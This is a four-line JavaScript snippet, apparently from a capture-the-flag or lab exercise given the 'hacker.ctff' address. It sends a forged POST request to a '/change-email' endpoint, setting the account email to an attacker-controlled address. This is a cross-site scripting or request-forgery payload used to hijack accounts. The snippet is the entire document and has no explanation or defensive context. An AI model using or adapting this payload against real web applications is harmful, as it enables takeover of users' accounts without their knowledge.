var xhr = new XMLHttpRequest();
xhr.open("POST", "/change-email", true);
xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
xhr.send("email=hacker@hacker.ctff");
